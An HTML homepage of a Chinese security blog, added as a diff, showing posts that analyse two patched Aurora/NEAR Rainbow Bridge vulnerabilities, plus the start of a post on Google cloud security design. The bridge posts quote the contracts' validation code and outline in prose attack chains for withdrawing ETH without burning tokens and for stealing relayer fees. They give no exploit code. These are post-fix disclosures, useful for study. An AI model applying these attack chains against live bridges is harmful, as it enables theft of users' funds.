@@ -1,0 +1,2256 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="网络安全,黑客,JAVA安全,代码审计,渗透测试,入侵,SRC,扫描,WEB安全,移动安全,PHP">
+    <meta name="description" content="蓝骨, langu.xyz">
+    <meta name="author" content="langu_xyz">
+    
+        <title>
+            
+                        langu_xyz
+        </title>
+        
+<link rel="stylesheet" href="/css/style.css">
+
+            <link rel="shortcut icon" href="/images/logo.jpeg">
+                
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+                    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"blog.langu.xyz","root":"/","language":"zh","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/logo.jpeg","favicon":"/images/logo.jpeg","article_img_align":"center","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/shamo.jpg","description":"XYZ(无限未来)"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+
+                    <script>
+                        var _hmt = _hmt || [];
+                        (function() {
+                          var hm = document.createElement("script");
+                          hm.src = "https://hm.baidu.com/hm.js?1cd6e64ff252acf24b707985fcec8850";
+                          var s = document.getElementsByTagName("script")[0]; 
+                          s.parentNode.insertBefore(hm, s);
+                        })();
+                        </script>
+                        
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="langu_xyz" type="application/atom+xml">
+</head>
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fas fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                    <a class="logo-title" href="/">
+                        langu_xyz
+                    </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class="active" href="/" >
+                                HOME
+                            </a>
+                        </li>
+                        
+                        <li class="menu-item">
+                            <a class="" href="/tags/THINK/" >
+                                THINK
+                            </a>
+                        </li>
+                        
+                            
+                                <li class="menu-item search search-popup-trigger">
+                                    <i class="fas fa-search"></i>
+                                </li>
+                                
+                                
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                    
+                        <div class="icon-item menu-bar">
+                            <div class="menu-bar-middle"></div>
+                        </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="active" href="/" >
+                        HOME
+                    </a>
+                </li>
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class="" href="/tags/THINK/" >
+                        THINK
+                    </a>
+                </li>
+                
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="home-content-container fade-in-down-animation">
+    <ul class="home-article-list">
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/Aurora%E9%94%80%E6%AF%81%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E4%BB%A3%E5%B8%81%E7%AA%83%E5%8F%96%E6%BC%8F%E6%B4%9E/">
+                        Aurora销毁逻辑错误导致代币窃取漏洞
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        跨链桥-RainBow Bridge
+Rainbow Bridge 不要求用户信任任何东西，除了区块链本身，称之为无信任。任何在 NEAR 上加密可证明的信息都可用于以太坊合约，反之亦然。
+例如以下信息：
+•    将交易包含在区块中；
+•    执行具有特定结果的交易；
+•    合约的状态。
+
+桥的设计桥背后的核心思想是它实现了两个轻客户端：     1.    作为 NEAR 合约在 Rust 中实现的以太坊轻客户端    2.    作为以太坊合约在 Solidity 中实现的 NEAR 轻客户端
+
+处理流程https://near.org/blog/eth-near-rainbow-bridge/
+1.    假设 Alice 想在 NEAR 区块链上将 X DAI 转给 Bob，她从 RainbowCLI/RainbowLib 发起转账；
+2.    RainbowLib 首先设置允许将 X DAI 从 Alice 转移到 TokenLocker；
+3.    然后它调用 TokenLocker 获取那些令牌，导致 TokenLocker 发出事件“Alice locked X tokens in favor of Bob”；
+4.    RainbowLib 然后等到 EthOnNearClient 收到包含此事件的以太坊标头，再加上 25 个区块进行确认；
+5.    然后 RainbowLib 计算这个事件的证明并提交给 MintableFungibleToken 合约；
+6.    MintableFungibleToken 合约然后通过调用 EthOnNearProver 来验证这个证明是否正确；
+    6.1.    EthOnNearProver 反过来验证证明的标头是否在 EthOnNearClient 的规范链上，并且它具有所需的确认次数。它还验证证明本身；
+    6.2.    MintableFungibleToken 然后解包以太坊事件并为 Bob 铸造 X nearDAI，完成转账。
+
+
+漏洞代码分析根据这个漏洞的基本信息，错误提交是漏洞的核心，先来看一下EthCustodian的withdraw函数是如何实现的。
+提取编码在’ proofData ‘中的适当数量的ETH，利用_parseAndConsumeProof对proofData进行解码。
+https://etherscan.io/address/0x6BFaD42cFC4EfC96f529D786D643Ff4A8B89FA52#code#F1#L116
+
+https://etherscan.io/address/0x6BFaD42cFC4EfC96f529D786D643Ff4A8B89FA52#code#F5#L45
+12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152function _parseAndConsumeProof(        bytes memory proofData,         uint64 proofBlockHeight    )        internal        returns(ProofDecoder.ExecutionStatus memory result)    &#123;        require(            proofBlockHeight &gt;= minBlockAcceptanceHeight_,            &#x27;Proof is from the ancient block&#x27;        );        require(            prover_.proveOutcome(proofData,proofBlockHeight),            &#x27;Proof should be valid&#x27;        );        // Unpack the proof and extract the execution outcome.        Borsh.Data memory borshData = Borsh.from(proofData);        ProofDecoder.FullOutcomeProof memory fullOutcomeProof =         borshData.decodeFullOutcomeProof();                require(            borshData.finished(),            &#x27;Argument should be exact borsh serialization&#x27;        );        bytes32 receiptId =         fullOutcomeProof.outcome_proof.outcome_with_id.outcome.receipt_ids[0];        require(            !usedEvents_[receiptId],            &#x27;The burn event cannot be reused&#x27;        );        usedEvents_[receiptId] = true;        require(            keccak256(fullOutcomeProof.outcome_proof.outcome_with_id.outcome.executor_id) ==             keccak256(nearProofProducerAccount_),            &#x27;Can only withdraw coins from the linked proof producer on Near blockchain&#x27;        );        result = fullOutcomeProof.outcome_proof.outcome_with_id.outcome.status;        require(            !result.failed,             &#x27;Cannot use failed execution outcome for unlocking the tokens&#x27;        );        require(            !result.unknown,            &#x27;Cannot use unknown execution outcome for unlocking the tokens&#x27;        );    &#125;
+
+从这里keccak256(fullOutcomeProof.outcome_proof.outcome_with_id.outcome.executor_id) == keccak256(nearProofProducerAccount_)可以看到会校验executor_id和nearProofProducerAccount_是否相等，也就是eth和near对应的合约是否一致。
+从Aurora的代码里找到对应的部分看下如何实现的。
+
+let mut executor = executor_params.make_executor(self);是这个漏洞的关键，可以看到Aurora将自己设置为了executor。
+这时候我们模拟流程看一下会发生什么。
+经过EthCustodian.sol初始处理后，会生成如下的数据包：
+
+包含了要发送的ETH数量、ETH的接收账户、执行此操作的地址。
+1234require(            result.ethCustodian == address(this),            &#x27;Can only withdraw coins that were expected for the current contract&#x27;        );
+
+在withdraw中验证result.ethCustodian是否等于BurnResult.ethCustodian，如果相等，则执行合约转账。
+当ETH侧发起转账时，Aurora侧withdraw_eth_from_near的会进行处理。
+
+同时重新定义了BurnResult数据结构如下：
+
+在 withdraw函数中直接调用了withdraw_eth_from_near函数，如下
+
+然后进一步跟踪withdraw_eth_from_near，最终在internal_withdraw_eth_from_near函数中实现了Near代币销毁。
+
+以上就是Near向ETH跨链发送代币的流程。
+那么如何利用漏洞来实现向ETH发送代币而不在Near链上销毁代币呢？
+在上文中分析过，ETH侧会判断执行者id和Aurora 合约发起地址匹配，如果可以将Aurora 合约发起地址设置为Aurora合约本身，就可以不需要销毁代币从而窃取ETH了。
+从Aurora的代码寻找会将自己设置为执行id的函数，在代码中我们找到三处，分别是deploy、call、view函数。
+
+所以攻击链就有了：
+0.    创建一个合约Evil进行跨链转币，进行数据封装
+0.    用view函数去调用Evil合约(理论上查看合约就可以触发)
+0.    这时候executor_id就是Aurora合约本身
+0.    自动化批量调用实现
+
+当前的修复方式是验证Evil中的EthCustodian是否等于Evil自身的EthCustodian。
+修复代码：
+
+https://medium.com/immunefi/aurora-withdrawal-logic-error-bugfix-review-c5b4e30a9160
+https://github.com/aurora-is-near/aurora-engine/commit/7109e30926ea33f67c6f702aa2b796b025cca96a
+https://etherscan.io/address/0x6BFaD42cFC4EfC96f529D786D643Ff4A8B89FA52#code
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <h2 id="跨链桥-RainBow-Bridge"><a href="#跨链桥-RainBow-Bridge" class="headerlink" title="跨链桥-RainBow Bridge"></a>跨链桥-RainBow Bridge</h2><p><img lazyload src="/images/loading.svg" data-src="1.png"></p>
+<p>Rainbow Bridge 不要求用户信任任何东西，除了区块链本身，称之为无信任。任何在 NEAR 上加密可证明的信息都可用于以太坊合约，反之亦然。</p>
+<p>例如以下信息：</p>
+<pre><code>•    将交易包含在区块中；
+•    执行具有特定结果的交易；
+•    合约的状态。
+</code></pre>
+<h3 id="桥的设计"><a href="#桥的设计" class="headerlink" title="桥的设计"></a>桥的设计</h3><p>桥背后的核心思想是它实现了两个轻客户端： <br>    1.    作为 NEAR 合约在 Rust 中实现的以太坊轻客户端<br>    2.    作为以太坊合约在 Solidity 中实现的 NEAR 轻客户端</p>
+<p><img lazyload src="/images/loading.svg" data-src="2.png"></p>
+<h3 id="处理流程"><a href="#处理流程" class="headerlink" title="处理流程"></a>处理流程</h3><p><a class="link" target="_blank" rel="noopener" href="https://near.org/blog/eth-near-rainbow-bridge/">https://near.org/blog/eth-near-rainbow-bridge/<i class="fas fa-external-link-alt"></i></a></p>
+<pre><code>1.    假设 Alice 想在 NEAR 区块链上将 X DAI 转给 Bob，她从 RainbowCLI/RainbowLib 发起转账；
+2.    RainbowLib 首先设置允许将 X DAI 从 Alice 转移到 TokenLocker；
+3.    然后它调用 TokenLocker 获取那些令牌，导致 TokenLocker 发出事件“Alice locked X tokens in favor of Bob”；
+4.    RainbowLib 然后等到 EthOnNearClient 收到包含此事件的以太坊标头，再加上 25 个区块进行确认；
+5.    然后 RainbowLib 计算这个事件的证明并提交给 MintableFungibleToken 合约；
+6.    MintableFungibleToken 合约然后通过调用 EthOnNearProver 来验证这个证明是否正确；
+    6.1.    EthOnNearProver 反过来验证证明的标头是否在 EthOnNearClient 的规范链上，并且它具有所需的确认次数。它还验证证明本身；
+    6.2.    MintableFungibleToken 然后解包以太坊事件并为 Bob 铸造 X nearDAI，完成转账。
+</code></pre>
+<p><img lazyload src="/images/loading.svg" data-src="3.png"></p>
+<h2 id="漏洞代码分析"><a href="#漏洞代码分析" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h2><p>根据这个漏洞的基本信息，错误提交是漏洞的核心，先来看一下EthCustodian的withdraw函数是如何实现的。</p>
+<p>提取编码在’ proofData ‘中的适当数量的ETH，利用_parseAndConsumeProof对proofData进行解码。</p>
+<p><a class="link" target="_blank" rel="noopener" href="https://etherscan.io/address/0x6BFaD42cFC4EfC96f529D786D643Ff4A8B89FA52#code#F1#L116">https://etherscan.io/address/0x6BFaD42cFC4EfC96f529D786D643Ff4A8B89FA52#code#F1#L116<i class="fas fa-external-link-alt"></i></a></p>
+<p><img lazyload src="/images/loading.svg" data-src="4.png"></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://etherscan.io/address/0x6BFaD42cFC4EfC96f529D786D643Ff4A8B89FA52#code#F5#L45">https://etherscan.io/address/0x6BFaD42cFC4EfC96f529D786D643Ff4A8B89FA52#code#F5#L45<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">function _parseAndConsumeProof(</span><br><span class="line">        bytes memory proofData, </span><br><span class="line">        uint64 proofBlockHeight</span><br><span class="line">    )</span><br><span class="line">        internal</span><br><span class="line">        returns(ProofDecoder.ExecutionStatus memory result)</span><br><span class="line">    &#123;</span><br><span class="line">        require(</span><br><span class="line">            proofBlockHeight &gt;= minBlockAcceptanceHeight_,</span><br><span class="line">            &#x27;Proof is from the ancient block&#x27;</span><br><span class="line">        );</span><br><span class="line">        require(</span><br><span class="line">            prover_.proveOutcome(proofData,proofBlockHeight),</span><br><span class="line">            &#x27;Proof should be valid&#x27;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        // Unpack the proof and extract the execution outcome.</span><br><span class="line">        Borsh.Data memory borshData = Borsh.from(proofData);</span><br><span class="line"></span><br><span class="line">        ProofDecoder.FullOutcomeProof memory fullOutcomeProof = </span><br><span class="line">        borshData.decodeFullOutcomeProof();</span><br><span class="line">        </span><br><span class="line">        require(</span><br><span class="line">            borshData.finished(),</span><br><span class="line">            &#x27;Argument should be exact borsh serialization&#x27;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        bytes32 receiptId = </span><br><span class="line">        fullOutcomeProof.outcome_proof.outcome_with_id.outcome.receipt_ids[0];</span><br><span class="line"></span><br><span class="line">        require(</span><br><span class="line">            !usedEvents_[receiptId],</span><br><span class="line">            &#x27;The burn event cannot be reused&#x27;</span><br><span class="line">        );</span><br><span class="line">        usedEvents_[receiptId] = true;</span><br><span class="line"></span><br><span class="line">        require(</span><br><span class="line">            keccak256(fullOutcomeProof.outcome_proof.outcome_with_id.outcome.executor_id) == </span><br><span class="line">            keccak256(nearProofProducerAccount_),</span><br><span class="line">            &#x27;Can only withdraw coins from the linked proof producer on Near blockchain&#x27;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        result = fullOutcomeProof.outcome_proof.outcome_with_id.outcome.status;</span><br><span class="line">        require(</span><br><span class="line">            !result.failed, </span><br><span class="line">            &#x27;Cannot use failed execution outcome for unlocking the tokens&#x27;</span><br><span class="line">        );</span><br><span class="line">        require(</span><br><span class="line">            !result.unknown,</span><br><span class="line">            &#x27;Cannot use unknown execution outcome for unlocking the tokens&#x27;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>从这里<code>keccak256(fullOutcomeProof.outcome_proof.outcome_with_id.outcome.executor_id) == keccak256(nearProofProducerAccount_)</code>可以看到会校验executor_id和nearProofProducerAccount_是否相等，也就是eth和near对应的合约是否一致。</p>
+<p>从Aurora的代码里找到对应的部分看下如何实现的。</p>
+<p><img lazyload src="/images/loading.svg" data-src="5.png"></p>
+<p><code>let mut executor = executor_params.make_executor(self);</code>是这个漏洞的关键，可以看到Aurora将自己设置为了executor。</p>
+<p>这时候我们模拟流程看一下会发生什么。</p>
+<p>经过EthCustodian.sol初始处理后，会生成如下的数据包：</p>
+<p><img lazyload src="/images/loading.svg" data-src="6.png"></p>
+<p>包含了要发送的ETH数量、ETH的接收账户、执行此操作的地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">require(</span><br><span class="line">            result.ethCustodian == address(this),</span><br><span class="line">            &#x27;Can only withdraw coins that were expected for the current contract&#x27;</span><br><span class="line">        );</span><br></pre></td></tr></table></figure>
+
+<p>在withdraw中验证result.ethCustodian是否等于BurnResult.ethCustodian，如果相等，则执行合约转账。</p>
+<p>当ETH侧发起转账时，Aurora侧withdraw_eth_from_near的会进行处理。</p>
+<p><img lazyload src="/images/loading.svg" data-src="7.png"></p>
+<p>同时重新定义了BurnResult数据结构如下：</p>
+<p><img lazyload src="/images/loading.svg" data-src="8.png"></p>
+<p>在 withdraw函数中直接调用了withdraw_eth_from_near函数，如下</p>
+<p><img lazyload src="/images/loading.svg" data-src="9.png"></p>
+<p>然后进一步跟踪withdraw_eth_from_near，最终在internal_withdraw_eth_from_near函数中实现了Near代币销毁。</p>
+<p><img lazyload src="/images/loading.svg" data-src="10.png"></p>
+<p>以上就是Near向ETH跨链发送代币的流程。</p>
+<p>那么如何利用漏洞来实现向ETH发送代币而不在Near链上销毁代币呢？</p>
+<p>在上文中分析过，ETH侧会判断执行者id和Aurora 合约发起地址匹配，如果可以将Aurora 合约发起地址设置为Aurora合约本身，就可以不需要销毁代币从而窃取ETH了。</p>
+<p>从Aurora的代码寻找会将自己设置为执行id的函数，在代码中我们找到三处，分别是deploy、call、view函数。</p>
+<p><img lazyload src="/images/loading.svg" data-src="11.png"></p>
+<p>所以攻击链就有了：</p>
+<pre><code>0.    创建一个合约Evil进行跨链转币，进行数据封装
+0.    用view函数去调用Evil合约(理论上查看合约就可以触发)
+0.    这时候executor_id就是Aurora合约本身
+0.    自动化批量调用实现
+</code></pre>
+<p>当前的修复方式是验证Evil中的EthCustodian是否等于Evil自身的EthCustodian。</p>
+<p>修复代码：</p>
+<p><img lazyload src="/images/loading.svg" data-src="12.png"></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://medium.com/immunefi/aurora-withdrawal-logic-error-bugfix-review-c5b4e30a9160">https://medium.com/immunefi/aurora-withdrawal-logic-error-bugfix-review-c5b4e30a9160<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://github.com/aurora-is-near/aurora-engine/commit/7109e30926ea33f67c6f702aa2b796b025cca96a">https://github.com/aurora-is-near/aurora-engine/commit/7109e30926ea33f67c6f702aa2b796b025cca96a<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://etherscan.io/address/0x6BFaD42cFC4EfC96f529D786D643Ff4A8B89FA52#code">https://etherscan.io/address/0x6BFaD42cFC4EfC96f529D786D643Ff4A8B89FA52#code<i class="fas fa-external-link-alt"></i></a></p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Wed Nov 23 2022 21:00:00 GMT+0800">2022-11-23</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/">区块链</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/Aurora%E9%94%80%E6%AF%81%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E4%BB%A3%E5%B8%81%E7%AA%83%E5%8F%96%E6%BC%8F%E6%B4%9E/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/Aurora%E8%BE%93%E5%85%A5%E5%A4%84%E7%90%86%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E8%B4%B9%E7%94%A8%E7%AA%83%E5%8F%96%E6%BC%8F%E6%B4%9E/">
+                        Aurora输入处理不当导致费用窃取漏洞
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        在aurora-engine 2.6.1版本，修复了一个Near跨链桥上的漏洞。
+
+在注释中有提到了大概的漏洞原理：Fixed the ability the steal funds from those by setting a fee when receiving NEP-141 as ERC-20。
+定位到漏洞代码入口处：
+
+根据之前注释中提到的原理，是在与ERC-20交互时产生的漏洞，跟踪receive_erc20_tokens这个方法
+
+receive_erc20_tokens的入参除了&amp;AccountId外，还有&amp;NEP141FtOnTransferArgs，去看下这个参数的含义
+
+实现很简单，发送账号、余额、字符串。回到receive_erc20_tokens方法中，看下这三个参数分别做了什么。
+
+
+其中可以看到msg参数经过一系列的长度判断，判断recipient是否有效以及fee的判断。
+
+在进行相关字段的验证后，进行ERC-20 token获取
+
+
+
+之后进行fee的处理，如果fee不等于0，则将fee从recipient发送到relayer_address。
+此刻，如果relayer_address可控，fee可控，则可通过向ETH链上地址发送near代币，设置fee不为0，根据上文逻辑，将会从receiver将fee转到relayer_address。
+第一个条件：relayer_address可控
+
+relayer_account_id是入参之一，天然可控，条件一达成。
+第二个条件：fee可控
+
+这里就需要NEP141FtOnTransferArgs了，从前文的逻辑中可以看到，amount也是入参，条件二达成。
+这时攻击者便可以在near上创建一个合约，然后不断构建NEP-141 -&gt; ERC20 的跨链请求，便可以不断的窃取ETH。
+参考：https://medium.com/immunefi/aurora-improper-input-sanitization-bugfix-review-a9376dac046f
+https://github.com/aurora-is-near/aurora-engine/commit/7109e30926ea33f67c6f702aa2b796b025cca96a
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <p>在aurora-engine 2.6.1版本，修复了一个Near跨链桥上的漏洞。</p>
+<p><img lazyload src="/images/loading.svg" data-src="1.png"></p>
+<p>在注释中有提到了大概的漏洞原理：Fixed the ability the steal funds from those by setting a fee when receiving NEP-141 as ERC-20。</p>
+<p>定位到漏洞代码入口处：</p>
+<p><img lazyload src="/images/loading.svg" data-src="2.png"></p>
+<p>根据之前注释中提到的原理，是在与ERC-20交互时产生的漏洞，跟踪receive_erc20_tokens这个方法</p>
+<p><img lazyload src="/images/loading.svg" data-src="3.png"></p>
+<p>receive_erc20_tokens的入参除了&amp;AccountId外，还有&amp;NEP141FtOnTransferArgs，去看下这个参数的含义</p>
+<p><img lazyload src="/images/loading.svg" data-src="4.png"></p>
+<p>实现很简单，发送账号、余额、字符串。回到receive_erc20_tokens方法中，看下这三个参数分别做了什么。</p>
+<p><img lazyload src="/images/loading.svg" data-src="5.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="6.png"></p>
+<p>其中可以看到msg参数经过一系列的长度判断，判断recipient是否有效以及fee的判断。</p>
+<p><img lazyload src="/images/loading.svg" data-src="7.png"></p>
+<p>在进行相关字段的验证后，进行ERC-20 token获取</p>
+<p><img lazyload src="/images/loading.svg" data-src="8.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="9.png"></p>
+<p><img lazyload src="/images/loading.svg" data-src="10.png"></p>
+<p>之后进行fee的处理，如果fee不等于0，则将fee从recipient发送到relayer_address。</p>
+<p>此刻，如果relayer_address可控，fee可控，则可通过向ETH链上地址发送near代币，设置fee不为0，根据上文逻辑，将会从receiver将fee转到relayer_address。</p>
+<p>第一个条件：relayer_address可控</p>
+<p><img lazyload src="/images/loading.svg" data-src="11.png"></p>
+<p>relayer_account_id是入参之一，天然可控，条件一达成。</p>
+<p>第二个条件：fee可控</p>
+<p><img lazyload src="/images/loading.svg" data-src="12.png"></p>
+<p>这里就需要NEP141FtOnTransferArgs了，从前文的逻辑中可以看到，amount也是入参，条件二达成。</p>
+<p>这时攻击者便可以在near上创建一个合约，然后不断构建NEP-141 -&gt; ERC20 的跨链请求，便可以不断的窃取ETH。</p>
+<p>参考：<a class="link" target="_blank" rel="noopener" href="https://medium.com/immunefi/aurora-improper-input-sanitization-bugfix-review-a9376dac046f">https://medium.com/immunefi/aurora-improper-input-sanitization-bugfix-review-a9376dac046f<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://github.com/aurora-is-near/aurora-engine/commit/7109e30926ea33f67c6f702aa2b796b025cca96a">https://github.com/aurora-is-near/aurora-engine/commit/7109e30926ea33f67c6f702aa2b796b025cca96a<i class="fas fa-external-link-alt"></i></a></p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Tue Nov 08 2022 21:00:00 GMT+0800">2022-11-08</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/">区块链</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/Aurora%E8%BE%93%E5%85%A5%E5%A4%84%E7%90%86%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E8%B4%B9%E7%94%A8%E7%AA%83%E5%8F%96%E6%BC%8F%E6%B4%9E/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/Google%E4%BA%91%E5%9F%BA%E7%A1%80%E6%9E%B6%E6%9E%84%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1%E5%AD%A6%E4%B9%A0/">
+                        Google云基础架构安全设计学习
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        一、责任共担模型和基础架构安全云提供商始终负责底层网络和基础架构，并且客户始终负责其访问政策和数据。
+
+Google 基础架构安全层详细参考：https://mp.weixin.qq.com/s/RJn5O5Gh-PJyt-1K2ivM8A (从位于底层的硬件基础架构安全性开始，到位于顶层的运营安全性。)
+
+二、安全的底层基础架构1. 安全启动栈和机器身份标识服务器利用以下技术确保启动正确的软件栈，启动链的硬件信任根如下：
+•    The Titan hardware chip
+•    A lockable firmware chip
+•    A microcontroller running our own security code
+
+通过自动化任务维护服务安全基线：
+•    确保服务器运行其软件栈的最新版本（包括安全补丁）。
+•    检测和诊断硬件和软件问题。
+•    使用启动时验证和隐式证明确保机器和外围设备的完整性。
+•    确保只有运行指定软件和固件的机器才能访问使其可在生产网络中进行通信的凭据。
+•    当不再需要机器时，在服务中移除或重新分配机器。
+
+三、安全的服务部署集群编排服务（Borg）控制直接在基础架构上运行的服务。
+“零信任安全模型”：基础架构假定基础架构上运行的服务之间不存在任何信任。无论是位于网络内部还是外部，默认情况下不信任任何设备或用户。
+BeyondCorp 认为“用户信任应该取决于设备的上下文感知状态等特征，而不是连接到公司网络的权限”；BeyondProd 认为“服务信任应该取决于代码出处和服务身份等特征，而不是生产网络中的位置（例如 IP 地址或主机名身份）”。
+下图对比了传统基础架构安全性方面与云原生架构中的安全性方面。更多细节参考：https://cloud.google.com/docs/security/beyondprod?hl=zh-cn
+
+在开发云原生架构时的安全原则：
+•    在边缘保护网络，以便将工作负载与来自互联网的网络攻击和未经授权的流量隔离开来。虽然基于防火墙的方法不是云原生架构的新概念，但仍然是安全性的最佳做法。在云原生世界中，边界方法用于保护尽可能多的基础架构，使其避开来自互联网的未经授权的流量和潜在的攻击，例如基于卷的拒绝服务攻击。
+
+•    服务之间没有固有的相互信任，只有已知的、受信任的、明确授权的调用者才能使用服务。这样可以阻止攻击者使用不可信代码访问服务。如果某个服务受到破解，这一原则可阻止攻击者执行扩大其攻击范围的操作。这种“互不信任”的机制有助于限制危害的范围。
+
+•    运行具有已知出处的代码的受信任机器，以便服务身份只能使用经过授权的代码和配置，并且只能在经过验证的授权环境中运行。
+
+•    用于跨服务强制执行一致政策的关卡。例如，一个用于验证访问用户数据的请求的关卡，以确保服务的访问来自于获得授权的最终用户发出且经过验证的请求，并且管理员的访问需要提供正当的理由。
+
+•    简单、自动化、标准化的更改发布，以便相关人员轻松审核基础架构更改对安全性的影响，并且可以在几乎不影响生产环境的情况下发布安全补丁程序。
+
